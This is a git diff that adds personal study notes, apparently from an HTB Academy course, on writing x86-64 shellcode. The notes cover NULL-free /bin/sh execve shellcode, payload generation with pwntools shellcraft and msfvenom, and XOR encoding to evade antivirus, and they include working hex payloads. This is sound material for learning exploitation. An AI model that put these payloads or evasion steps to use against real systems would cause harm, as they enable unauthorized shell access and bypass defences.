@@ -100,6 +100,16 @@
     - [Debugging Shellcode](#debugging-shellcode)
       - [pwntools](#pwntools)
       - [GCC](#gcc)
+  - [Shellcoding Techniques](#shellcoding-techniques)
+    - [Shellcoding Requirements](#shellcoding-requirements)
+      - [Remove Variables](#remove-variables)
+      - [Remove Addresses](#remove-addresses)
+      - [Remove NULL](#remove-null)
+  - [Shellcode Tools](#shellcode-tools)
+    - [Shell Shellcode](#shell-shellcode)
+    - [Shellcraft](#shellcraft)
+    - [Msfvenom](#msfvenom)
+    - [Shellcode Encoding](#shellcode-encoding)
 
 ---
 
@@ -2846,5 +2856,437 @@ d41y@htb[/htb]$ gcc helloworld.c -o helloworld -fno-stack-protector -z execstack
 d41y@htb[/htb]$ ./helloworld
 
 Hello HTB Academy!
+```
+
+## Shellcoding Techniques
+
+### Shellcoding Requirements
+
+There are specific requirements a shellcode must meet. Otherwise, it won't be able to be properly disassembled on runtime into its correct Assembly instructions.
+
+Example:
+
+```bash
+$ pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'
+   0:    48 be 00 20 40 00 00     movabs rsi,  0x402000
+   7:    00 00 00
+   a:    bf 01 00 00 00           mov    edi,  0x1
+   f:    ba 12 00 00 00           mov    edx,  0x12
+  14:    b8 01 00 00 00           mov    eax,  0x1
+  19:    0f 05                    syscall
+  1b:    b8 3c 00 00 00           mov    eax,  0x3c
+  20:    bf 00 00 00 00           mov    edi,  0x0
+  25:    0f 05                    syscall
+```
+
+You see that there's an empty line of instructions, which could potentially break the code. Furthermore, your HelloWorld string is nowhere to be seen. You also see many red ```00```s.
+
+This is what will happen if your Assembly code is not shellcode compliant and does not meet the Shellcode Requirements. To be able to produce a working shellcode, there are three main Shellcoding Requirements your Assembly code must meet:
+
+1. does not contain variables
+2. does not refer to direct memory addresses
+3. does not contain and NULL bytes ```00```
+
+You need to fix the following Assembly code:
+
+```x86asm
+global _start
+
+section .data
+    message db "Hello HTB Academy!"
+
+section .text
+_start:
+    mov rsi, message
+    mov rdi, 1
+    mov rdx, 18
+    mov rax, 1
+    syscall
+
+    mov rax, 60
+    mov rdi, 0
+    syscall
+```
+
+#### Remove Variables
+
+A shellcode is expected to be directly executable once loaded into memory, without loading data from other memory segments, like ```.data``` or ```.bss```. This is because the ```text``` memory segments are not writable, so you cannot write any variables. In contrast, the ```data``` segment is not executable, so you cannot write executable code.
+
+So, to execute your shellcode, you must load it in the ```text``` memory segment and lose the ability to write any variables. Hence, your entire shellcode must be under ```.text``` in the Assembly code.
+
+There are many techniques you can use to avoid using variables:
+
+1. moving immediate strings to registers
+2. pushing strings to the Stack, and then use them
+
+Example of moving your string to ```rsi```:
+
+```x86asm
+    mov rsi, 'Academy!'
+```
+
+However, y 64-bit register can only hold 8 bytes, which may not be enough for larger strings. So, your other option is to rely on the Stack by pushing your string 16-bytes at a time, and then using ```rsp``` as your string pointer:
+
+```x86asm
+    push 'y!'
+    push 'B Academ'
+    push 'Hello HT'
+    mov rsi, rsp
+```
+
+However, this would exceed the allowed bounds of immediate strings ```push```, which is a ```dword``` at a time. So, you will instead move your string to ```rbx```, and then push ```rbx``` to the Stack:
+
+```x86asm
+    mov rbx, 'y!'
+    push rbx
+    mov rbx, 'B Academ'
+    push rbx
+    mov rbx, 'Hello HT'
+    push rbx
+    mov rsi, rsp
+```
+
+You can now apply these changes to your code, assemble it and run it to see if it works:
+
+```bash
+d41y@htb[/htb]$ ./assembler.sh helloworld.s
+
+Hello HTB Academy!
+```
+
+... in GDB:
+
+```bash
+$ gdb -q ./helloworld
+─────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x1               
+$rbx   : 0x5448206f6c6c6548 ("Hello HT"?)
+$rcx   : 0x0               
+$rdx   : 0x12              
+$rsp   : 0x00007fffffffe3b8  →  "Hello HTB Academy!"
+$rbp   : 0x0               
+$rsi   : 0x00007fffffffe3b8  →  "Hello HTB Academy!"
+$rdi   : 0x1               
+─────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe3b8│+0x0000: "Hello HTB Academy!"	 ← $rsp, $rsi
+0x00007fffffffe3c0│+0x0008: "B Academy!"
+0x00007fffffffe3c8│+0x0010: 0x0000000000002179 ("y!"?)
+───────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+→   0x40102e <_start+46>      syscall 
+──────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+#### Remove Addresses
+
+You may see references to addresses in many cases, especially with calls or loops and such. So, you must ensure that your shellcode will know how to make the call with whatever environment it runs in.
+
+To be able to do so, you cannot reference direct memory address, and instead only make calls to labels or relative memory addresses.
+
+If you ever had any calls or references to direct memory addresses, you can fix that by:
+
+1. replacing with calls to labels or rip-relative addresses
+2. push to the stack and use ```rsp``` as the address
+
+#### Remove NULL
+
+NULL chars are used as string terminators in Assembly and machine code, and so if they are encountered, they will cause issues and may lead the program to terminate early. So, you must ensure that your shellcode does not contain any NULL bytes 00. If you go back to your HelloWorld shellcode disassembly, you noticed many red 00s in it:
+
+```x86asm
+$ pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'
+   0:    48 be 00 20 40 00 00     movabs rsi,  0x402000
+   7:    00 00 00
+   a:    bf 01 00 00 00           mov    edi,  0x1
+   f:    ba 12 00 00 00           mov    edx,  0x12
+  14:    b8 01 00 00 00           mov    eax,  0x1
+  19:    0f 05                    syscall
+  1b:    b8 3c 00 00 00           mov    eax,  0x3c
+  20:    bf 00 00 00 00           mov    edi,  0x0
+  25:    0f 05                    syscall
+```
+
+This commonly happens when moving a small integer into a large register, so the integer gets padded with an extra ```00``` to fit the larger register's size.
+
+For example, in your code above, when you use ```mov rax, 1``` it will be moving ```00 00 00 01``` into ```rax```, such that the number size would match the register size. To verify:
+
+```bash
+d41y@htb[/htb]$ pwn asm 'mov rax, 1' -c 'amd64'
+
+48c7c001000000
+```
+
+To avoid having these NULL bytes, you must use registers that match your data size. For the previous example, you can use the more efficient instruction ```mov al, 1```. However, before you do so, you must first zero ot the ```rax``` register with ```xor rax, rax```, to ensure your data does not get mixed with older data.
+
+```bash
+d41y@htb[/htb]$ pwn asm 'xor rax, rax' -c 'amd64'
+
+4831c0
+$ pwn asm 'mov al, 1' -c 'amd64'
+
+b001
+```
+
+As you can see, not only does your new shellcode not contain any NULL bytes, but it is also shorter, which is a very desired thing in shellcodes.
+
+You can start with the new instruction you added earlier, ```mov rbx, 'y!'```. You see that this instruction is moving 2-bytes into an 8-byte register. So to fix it, you will first zero-out ```rbx```, and then use the 2-byte register:
+
+```x86asm
+    xor rbx, rbx
+    mov bx, 'y!'
+```
+
+... applied to the whole code:
+
+```x86asm
+    xor rax, rax
+    mov al, 1
+    xor rdi, rdi
+    mov dil, 1
+    xor rdx, rdx
+    mov dl, 18
+    syscall
+
+    xor rax, rax
+    add al, 60
+    xor dil, dil
+    syscall
+```
+
+... leads to:
+
+```x86asm
+global _start
+
+section .text
+_start:
+    xor rbx, rbx
+    mov bx, 'y!'
+    push rbx
+    mov rbx, 'B Academ'
+    push rbx
+    mov rbx, 'Hello HT'
+    push rbx
+    mov rsi, rsp
+    xor rax, rax
+    mov al, 1
+    xor rdi, rdi
+    mov dil, 1
+    xor rdx, rdx
+    mov dl, 18
+    syscall
+
+    xor rax, rax
+    add al, 60
+    xor dil, dil
+    syscall
+```
+
+If you run it now, you can see it still works:
+
+```bash
+d41y@htb[/htb]$ ./assembler.sh helloworld.s
+
+Hello HTB Academy!
+```
+
+## Shellcode Tools
+
+### Shell Shellcode
+
+To craft your own ```/bin/sh``` shellcode you can use the ```execve``` syscall with syscall number 59, which allows you to execute a system application.
+
+```bash
+d41y@htb[/htb]$ man -s 2 execve
+
+int execve(const char *pathname, char *const argv[], char *const envp[]);
+```
+
+As you can see, the ```execve``` syscall accepts 3 args. You need to execute ```/bin/sh /bin/sh```, which would drop you in a ```sh``` shell:
+
+```c
+execve("/bin//sh", ["/bin//sh"], NULL)
+```
+
+So, you will set your arguments as:
+
+1. ```rax``` -> 59
+2. ```rdi``` -> ```['/bin/(sh']```
+3. ```rsi``` -> ```['/bin//sh']```
+4. ```rdx``` -> ```NULL```
+
+> [!NOTE]
+> Added an extra ```/``` in ```/bin//sh``` so that the total char count is 8, which fills up a 64-bit register, so you don't have to worry about clearing the register beforehand or dealing with any leftovers. Any extra slashes are ignored in Linux, so this is a handy trick to even the total char count when needed, and it is used a lot in binary exploitation.
+
+Using the same concepts you learned for calling a syscall, the following Assembly code should execute the syscall you need:
+
+```x86asm
+global _start
+
+section .text
+_start:
+    mov rax, 59         ; execve syscall number
+    push 0              ; push NULL string terminator
+    mov rdi, '/bin//sh' ; first arg to /bin/sh
+    push rdi            ; push to stack 
+    mov rdi, rsp        ; move pointer to ['/bin//sh']
+    push 0              ; push NULL string terminator
+    push rdi            ; push second arg to ['/bin//sh']
+    mov rsi, rsp        ; pointer to args
+    mov rdx, 0          ; set env to NULL
+    syscall
+```
+
+As you can see, you pushed two ```'/bin//sh'``` strings and then moved their pointers to ```rdi``` and ```rsi```. It won't produce a working shellcode since it contains NULL bytes.
+
+Better example:
+
+```x86asm
+_start:
+    mov al, 59          ; execve syscall number
+    xor rdx, rdx        ; set env to NULL
+    push rdx            ; push NULL string terminator
+    mov rdi, '/bin//sh' ; first arg to /bin/sh
+    push rdi            ; push to stack 
+    mov rdi, rsp        ; move pointer to ['/bin//sh']
+    push rdx            ; push NULL string terminator
+    push rdi            ; push second arg to ['/bin//sh']
+    mov rsi, rsp        ; pointer to args
+    syscall
+```
+
+To verify:
+
+```bash
+d41y@htb[/htb]$ python3 shellcoder.py sh
+
+b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
+27 bytes - No NULL bytes
+```
+
+### Shellcraft
+
+With pwntools, especially the ```shellcraft``` library, you can generate a shellcode for various syscalls. You can list syscalls the tool accepts:
+
+```bash
+d41y@htb[/htb]$ pwn shellcraft -l 'amd64.linux'
+
+...SNIP...
+amd64.linux.sh
+```
+
+You see that ```amd64.linux.sh``` syscall, which would drop you into a shell. You can generate it like this:
+
+```bash
+d41y@htb[/htb]$ pwn shellcraft amd64.linux.sh -r
+
+$ whoami
+
+root
+```
+
+You can run this shellcode by adding the ```-r``` flag:
+
+```bash
+d41y@htb[/htb]$ pwn shellcraft amd64.linux.sh -r
+
+$ whoami
+
+root
+```
+
+### Msfvenom
+
+... is another common tool you can use for shellcode generation. Once again, you can list various available payloads for Linux and x86_64 with:
+
+```bash
+d41y@htb[/htb]$ msfvenom -l payloads | grep 'linux/x64'
+
+linux/x64/exec                                      Execute an arbitrary command
+...SNIP...
+```
+
+The ```exec``` payload allows you to execute a command you specify.
+
+```bash
+d41y@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'
+
+No encoder specified, outputting raw payload
+Payload size: 48 bytes
+Final size of hex file: 96 bytes
+6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05
+```
+
+... when used:
+
+```bash
+d41y@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05'
+
+$ whoami
+
+root
+```
+
+### Shellcode Encoding
+
+Another great benefit of using these tools is to encode your shellcodes without manually writing your encoders. Encoding shellcodes can become a handy feature for systems with AV or certain security protections. However, it must be noted that shellcodes encoded with common encoders may be easy to detect.
+
+You can use msfvenom to encode your shellcode as well. Available encoders:
+
+```bash
+d41y@htb[/htb]$ msfvenom -l encoders
+
+Framework Encoders [--encoder <value>]
+======================================
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/brace                     low        Bash Brace Expansion Command Encoder
+    cmd/echo                      good       Echo Command Encoder
+
+<SNIP>
+```
+
+Then you can pick one for x64, like ```x86/xor```, and use it with the ```-e``` flag:
+
+```bash
+d41y@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
+
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 87 (iteration=0)
+x64/xor chosen with final size 87
+Payload size: 87 bytes
+Final size of hex file: 174 bytes
+4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c
+```
+
+... when used:
+
+```bash
+d41y@htb[/htb]$ python3 loader.py 
+'4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c'
+
+$ whoami
+
+root
+```
+
+You can see that the encoded shellcode is always significantly larger than the non-encoded one since encoding a shellcode adds a built-in decoder for runtime decoding. It may also encode each byte multiple times, which increases its size at every iteration.
+
+> [!NOTE]
+> You can encode your shellcode multiple times with the ```-i COUNT``` flag, and specify the number of iterations you want.
+
+If you had a custom shellcode that you wrote, you could use msfvenom to encode it as well, by writing its bytes to a file and then passing it to msfvenom with ```-p -```:
+
+```bash
+d41y@htb[/htb]$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin
+d41y@htb[/htb]$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 71 (iteration=0)
+x64/xor chosen with final size 71
+Payload size: 71 bytes
+Final size of hex file: 142 bytes
+4831c94881e9fcffffff488d05efffffff48bb5a63e4e17d0bac1348315827482df8ffffffe2f4ea58acd0af59e4ac75018d8f5224df7b0d2b6d062f5ce49abc6ce1e17d0bac13
 ```
 
